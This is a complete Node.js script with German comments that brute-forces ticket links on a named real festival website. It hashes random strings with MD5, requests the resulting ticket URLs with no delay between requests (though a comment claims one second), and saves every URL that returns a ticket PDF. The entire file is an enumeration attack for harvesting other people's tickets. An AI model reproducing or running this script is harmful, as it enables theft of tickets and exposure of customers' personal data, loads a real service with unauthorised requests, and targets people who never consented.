const https = require('https');
const fs = require('fs');
const crypto = require('crypto');

const baseUrl = 'https://nolimitsfestivals.nl/tickets/';
const delay = 0; // 1 Sekunde Verzögerung
const hashesFile = 'processedHashes.txt';

function generateRandomString() {
    const length = Math.floor(Math.random() * 20) + 1; // Zufällige Länge zwischen 1 und 20
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function md5(data) {
    return crypto.createHash('md5').update(data).digest("hex");
}

async function fetchURL(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            const { statusCode } = res;
            const contentType = res.headers['content-type'];

            if (statusCode !== 200) {
                reject(new Error(`Fehler beim Abruf von ${url}. Status Code: ${statusCode}`));
                res.resume();
                return;
            }

            if (contentType === 'application/pdf') {
                fs.appendFileSync('foundURLs.txt', `${url}\n`);
                console.log("Success")
            } else {
                console.log("Failure")
            }

            res.resume();
            resolve();
        }).on('error', (e) => {
            reject(e);
        });
    });
}

async function bruteForceMD5() {
    let processedHashes = new Set();

    // Lade bereits bearbeitete Hashes aus der Datei
    if (fs.existsSync(hashesFile)) {
        const hashesFromFile = fs.readFileSync(hashesFile, 'utf-8').split('\n');
        for (const hash of hashesFromFile) {
            processedHashes.add(hash.trim());
        }
    }

    while (true) {
        const randomString = generateRandomString();
        const hash = md5(randomString);

        if (processedHashes.has(hash)) continue;

        const fullUrl = baseUrl + hash + '/';
        
        await fetchURL(fullUrl);
        await new Promise(resolve => setTimeout(resolve, delay));

        fs.appendFileSync(hashesFile, `${hash}\n`);
        processedHashes.add(hash);
    }
}

bruteForceMD5()
    .then(() => {
        console.log('Fertig.');
    })
    .catch((err) => {
        console.error('Ein Fehler ist aufgetreten:', err);
    });
